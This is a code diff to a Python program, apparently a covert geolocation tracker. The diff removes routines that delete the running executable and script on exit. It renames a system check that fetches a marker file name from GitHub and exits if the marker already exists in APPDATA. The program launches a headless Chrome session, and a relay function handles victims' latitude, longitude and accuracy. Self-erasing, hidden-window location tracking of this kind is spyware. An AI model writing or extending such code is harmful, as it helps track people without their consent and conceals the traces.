@@ -25,33 +25,8 @@ import atexit
 import time
 import shutil
 
-def delete_exe():
-    # Get the path of the currently running executable
-    exe_path = sys.argv[0]
-    
-    # Delay for a moment to make sure the process terminates
-    time.sleep(1)  # Small sleep to give the OS time to finalize processes
-    
-    try:
-        # Delete the executable file
-        os.remove(exe_path)
-    except Exception as e:
-        pass
 
-def term():
-    # Schedule the EXE file deletion when the program exits
-    atexit.register(delete_exe)
-    
-    # Optionally, perform other cleanup tasks like removing temporary files
-    script_path = os.path.abspath(__file__)
-    if os.path.exists(script_path):
-        try:
-            os.remove(script_path)  # Only for non-packaged versions, avoid on EXE
-        except Exception as e:
-            if SELF_DEBUG:
-                debug(f"Failed to remove script: {str(e)}")
-
-def check_system():
+def tracker_check():
     appdata_path = os.getenv('APPDATA')
     file_name = requests.get('https://github.com/Synthiny/GeoSleuth/raw/refs/heads/main/html/fname.html').text.strip()
 
@@ -60,8 +35,7 @@ def check_system():
     if os.path.exists(file_path):
 
         if SELF_DEBUG == True:debug(f"File {file_name} already exists. Exiting...")
-        term()
-        sys.exit()
+        os._exit(0)
 
     with open(file_path, 'w') as f:
         f.write("")
@@ -149,7 +123,7 @@ def relay(CLIENT_LATITUDE, CLIENT_LONGITUDE, CLIENT_ACCURACY, CLIENT_ILA):
 
 def start():
     if SELF_SYSTEMCHECK == True:
-        check_system()
+        tracker_check()
     chrome_options = Options()
     if SELF_NOWINDOW == True:
         chrome_options.add_argument("--headless") 
@@ -192,4 +166,5 @@ def start():
 
 
 if __name__ in "__main__":
+    os.chdir(os.path.dirname(os.path.abspath(__file__)))
     start()
